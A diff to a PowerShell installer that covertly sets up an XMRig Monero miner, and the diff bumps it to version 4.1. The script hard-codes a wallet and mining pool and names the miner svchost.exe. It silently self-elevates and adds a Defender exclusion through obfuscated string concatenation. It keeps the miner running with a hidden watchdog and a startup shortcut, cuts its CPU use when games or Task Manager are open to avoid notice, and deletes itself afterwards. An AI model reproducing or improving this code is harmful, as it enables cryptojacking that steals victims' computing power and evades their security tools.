@@ -9,7 +9,7 @@
     - Process validation
     - Crash recovery
 .NOTES
-    Version: 4.0.0 - ULTRA SAFE
+    Version: 4.1.0 - ULTRA SAFE + FIXED
 #>
 
 $ErrorActionPreference = "SilentlyContinue"
@@ -18,11 +18,11 @@ $ProgressPreference = "SilentlyContinue"
 # ─── ULTRA-SAFE DEFAULTS ──────────────────────────────────────────────────
 $WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
 $POOL   = "gulf.moneroocean.stream:10001"
-$THREADS = 4          # ULTRA LOW - 4 threads only
-$IDLE_CPU = 30        # 30% MAX - very conservative
-$GAME_CPU = 15        # Even lower for games
+$THREADS = 4
+$IDLE_CPU = 30
+$GAME_CPU = 15
 $TASKMGR_CPU = 10
-$PRIORITY = "Idle"    # Always Idle priority
+$PRIORITY = 0
 $BASE   = "$env:ProgramData\SysOpt"
 $BINARY = "$BASE\svchost.exe"
 $CONFIG = "$BASE\config.json"
@@ -33,19 +33,13 @@ $WATCHDOG_BAT = "$BASE\watchdog.bat"
 $WATCHDOG_VBS = "$BASE\watchdog.vbs"
 $MLINK_VBS  = "$BASE\mklink.vbs"
 
-$WALLET = "435swUE8htb96xMwWXbfnzCXCkiKWQhcVKpQzjAHwNMkiWxPnzJiaiH82ucpvnfgpebBJ9QMjyVWnFdF6ih42LVLJY587wv"
-$POOL   = "gulf.moneroocean.stream:10001"
 $THREADS = 4
 $IDLE_CPU = 30
 $GAME_CPU = 15
 $TASKMGR_CPU = 10
-$PRIORITY = 0  # Idle = 0
+$PRIORITY = 0
 $THREADS = 4
 
-$ErrorActionPreference = "SilentlyContinue"
-$ProgressPreference = "SilentlyContinue"
-
-# ─── GAME LIST ────────────────────────────────────────────────────────────
 $GAME_PROCESSES = @(
     "steam.exe","steamwebhelper.exe","epicgameslauncher.exe","epicgames.exe",
     "battle.net.exe","agent.exe","origin.exe","eaapp.exe","eadesktop.exe",
@@ -122,6 +116,10 @@ function Test-Admin {
 
 function Get-Lock {
     try {
+        # Ensure base directory exists FIRST
+        if (-not (Test-Path $BASE)) {
+            New-Item -ItemType Directory -Path $BASE -Force | Out-Null
+        }
         if (Test-Path $LOCK_FILE) {
             $pid = Get-Content $LOCK_FILE -ErrorAction SilentlyContinue
             if ($pid) {
@@ -207,6 +205,9 @@ function Stop-OurMiner {
     if ($pid) { Stop-Process -Id $pid -Force -ErrorAction SilentlyContinue; Start-Sleep 2 }
 }
 
+# ─── ENSURE BASE DIRECTORY EXISTS FIRST ───────────────────────────────────
+New-Item -ItemType Directory -Path $BASE -Force | Out-Null
+
 # ─── LOCK CHECK ──────────────────────────────────────────────────────────
 if (-not (Get-Lock)) { Write-Log "Another installer running, exiting"; exit 0 }
 
@@ -222,11 +223,9 @@ if ((Test-Path $FLAG) -and (Test-Path $BINARY)) {
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
     Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$($MyInvocation.MyCommand.Path)`""; exit 0
 }
-Write-Log "=== INSTALLER STARTED (v4.0 ULTRA SAFE) ==="
+Write-Log "=== INSTALLER STARTED (v4.1 FIXED) ==="
 
-# ─── SETUP ────────────────────────────────────────────────────────────────
-New-Item -ItemType Directory -Path $BASE -Force | Out-Null
-
+# ─── DEFENDER EXCLUSION ───────────────────────────────────────────────────
 try {
     $c1 = "Add-Mp"; $c2 = "Preference"; $c3 = "-Exclusion"; $c4 = "Path"
     iex "$c1$c2 $c3$c4 $BASE"
@@ -237,14 +236,14 @@ try {
 Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
 Start-Sleep 2
 
-# ─── DOWNLOAD XMRIG ──────────────────────────────────────────────────────
+# ─── DOWNLOAD XMRIG ───────────────────────────────────────────────────────
 $zipPath = "$BASE\sys.zip"
-$headers = @{"User-Agent" = "SysOpt/4.0"}
+$headers = @{"User-Agent" = "SysOpt/4.1"}
 
 function Try-Download($repo, $pattern, $sourceName) {
     try {
         Write-Log "Checking $sourceName..."
-        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers @{"User-Agent"="SysOpt/4.0"} -TimeoutSec 20
+        $rel = Invoke-RestMethod "https://api.github.com/repos/$repo/releases/latest" -Headers @{"User-Agent"="SysOpt/4.1"} -TimeoutSec 20
         $asset = $rel.assets | Where-Object { $_.name -match $pattern -and $_.name -notmatch "sha256" } | Select-Object -First 1
         if ($asset) {
             $version = $rel.tag_name -replace '^v', ''
@@ -314,11 +313,11 @@ try {
     Write-Log "Defender exclusion added"
 } catch {}
 
-# ─── STOP EXISTING ───────────────────────────────────────────────────────
+# ─── KILL EXISTING ───────────────────────────────────────────────────────
 Stop-Process -Name "svchost" -Force -ErrorAction SilentlyContinue
 Start-Sleep 2
 
-# ─── WATCHDOG (SINGLE, SIMPLE, RELIABLE) ────────────────────────────────
+# ─── WATCHDOG (SINGLE, SIMPLE, RELIABLE) ����������������������������������
 $bat = "@echo off`n:loop`ntasklist /FI `"`IMAGENAME eq svchost.exe`" 2>NUL | find /I `"`svchost.exe`" >NUL`nif errorlevel 1 (start `"`" /MIN `"`$BASE\svchost.exe`" --config=`"`$BASE\config.json`"`) `ntimeout /t 60 /nobreak >NUL`ngoto loop"
 [System.IO.File]::WriteAllText("$BASE\watchdog.bat", $bat, [System.Text.UTF8Encoding]::UTF8)
 $vbs = 'Set s=CreateObject("WScript.Shell"):s.Run """' + "$BASE\watchdog.bat" + '""",0,False'
@@ -342,7 +341,7 @@ $lnkVbs = 'Set s=CreateObject("WScript.Shell"):Set l=s.CreateShortcut(s.SpecialF
 [System.IO.File]::WriteAllText("$BASE\mklink.vbs", $lnkVbs, [System.Text.UTF8Encoding]::UTF8)
 & wscript.exe "$BASE\mklink.vbs"
 
-# ─── START WATCHDOG ──────────────────────────────────────────────────────
+# ─── START WATCHDOG ��������������������������������������������������������
 Start-Sleep 1
 & wscript.exe "$BASE\watchdog.vbs"
 Write-Log "Watchdog started"
@@ -353,7 +352,6 @@ Set-Content $FLAG -Value (Get-Date).ToString() -Encoding UTF8
 Write-Log "=== INSTALLATION COMPLETE ==="
 
 # ─── CLEANUP ─────────────────────────────────────────────────────────────
-Release-Lock
 $myPath = $MyInvocation.MyCommand.Path
 if ($myPath -and (Test-Path $myPath)) {
     Start-Sleep 1
